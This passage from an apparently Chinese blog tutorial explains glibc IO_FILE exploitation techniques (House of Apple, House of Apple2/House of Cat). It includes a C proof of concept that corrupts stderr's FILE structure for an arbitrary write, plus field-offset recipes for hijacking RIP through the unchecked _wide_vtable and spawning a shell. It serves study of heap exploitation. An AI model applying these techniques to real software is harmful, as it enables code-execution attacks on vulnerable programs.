class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure></div>

<p>因此只要控制了 <code>_wide_data</code> 指针就能完成任意地址写。其中需要绕过如下判断：</p>
<ul>
<li>为了能够进入 <code>_IO_wstrn_overflow</code> 函数的 if 判断中，需要满足 <code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code> 。</li>
<li>为了避免执行 <code>free (f-&gt;_wide_data-&gt;_IO_buf_base);</code> 需要满足 <code>f-&gt;_wide_data-&gt;_IO_buf_base</code> 为空或者 <code>f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF</code> 不为 0 ，其中 <code>_IO_FLAGS2_USER_WBUF</code> 为 8 。</li>
<li>另外如果利用 FSOP 触发需要满足：<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/28394641dc65ceca722b37cef61c2d15.png"
                     
                ><br><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_apple" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *) puts_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = libc_base + <span class="number">0x3b8608</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *) stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = libc_base + <span class="number">0x3b8654</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *) stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = libc_base + <span class="number">0x3b8680</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *) stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = libc_base + <span class="number">0x3b86b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *) sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = libc_base + <span class="number">0x3b3c40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *) _IO_wstrn_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr_write_ptr_addr = (<span class="type">size_t</span>) <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr_wide_data_addr = (<span class="type">size_t</span>) p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) sdterr_vtable_addr = (<span class="type">size_t</span>) _IO_wstrn_jumps_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="House-of-Apple2-House-of-Cat"><a href="#House-of-Apple2-House-of-Cat" class="headerlink" title="House of Apple2 | House of Cat"></a>House of Apple2 | House of Cat</h2><p><code>_wide_data</code> 结构中有一个类似 <code>vtable</code> 的 <code>_wide_vtable</code> 指向 <code>_IO_jump_t</code> 结构。</p>
<p>与 <code>vtable</code> 相同，对 glibc 中也定义了调用 <code>_wide_vtable</code> 中函数的宏，其中在 glibc 中真正使用到的有 <code>_IO_WSETBUF</code>、<code>_IO_WUNDERFLOW</code>、<code>_IO_WDOALLOCATE</code>，但与 <code>vtable</code> 不同的是这三个宏均缺少对 <code>_wide_vtable</code> 位置的检查。</p>
<p>例如 <code>_IO_OVERFLOW</code> 的宏在调用 <code>__overflow</code> 函数之前调用了 <code>IO_validate_vtable</code> 检查 <code>vtable</code> 位置的合法性。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure></div>

<p>而 <code>_IO_WOVERFLOW</code> 没有检查。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure></div>

<p>因此可以通过修改 <code>vtable</code> 改变程序执行流程，使程序调用 <code>_wide_vtable</code> 中的函数，然后再将 <code>_wide_vtable</code> 指向一个伪造的函数表从而劫持程序执行流程。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/214fa556139c2a5b9595aa209bbff5df.png"
                     
                ><br>具体利用方式有以下几种：</p>
<h3 id="利用-IO-wfile-overflow函数控制程序执行流"><a href="#利用-IO-wfile-overflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_overflow函数控制程序执行流"></a>利用_IO_wfile_overflow函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>;sh;</code> 。</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>函数的调用链如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>首先看<code>_IO_wfile_overflow</code>函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wdoallocbuf (f);<span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要满足<code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>并且<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code>和<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p>
<p>然后看<code>_IO_wdoallocbuf</code>函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="comment">// _IO_WXXXX调用</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">             fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure></div>

<p>需要满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code>和<code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code>。</p>
<h3 id="利用-IO-wfile-underflow-mmap函数控制程序执行流"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用_IO_wfile_underflow_mmap函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>函数的调用链如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>看<code>_IO_wfile_underflow_mmap</code>函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</code>和<code>fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code>。</p>
<h3 id="利用-IO-wdefault-xsgetn函数控制程序执行流"><a href="#利用-IO-wdefault-xsgetn函数控制程序执行流" class="headerlink" title="利用_IO_wdefault_xsgetn函数控制程序执行流"></a>利用_IO_wdefault_xsgetn函数控制程序执行流</h3><p><strong>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0</strong>。如果不满足这个条件，可选用其他链。</p>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<p>函数的调用链如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>首先看<code>_IO_wdefault_xsgetn</code>函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">          <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">          <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">        *s++ = *p++;</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure></div>

<p>由于<code>more</code>是第三个参数，所以不能为<code>0</code>。<br>直接设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code>count</code>为<code>0</code>，不进入<code>if</code>分支。<br>随后当<code>more != 0</code>时会进入<code>__wunderflow</code>。</p>
<p>接着看<code>__wunderflow</code>：</p>
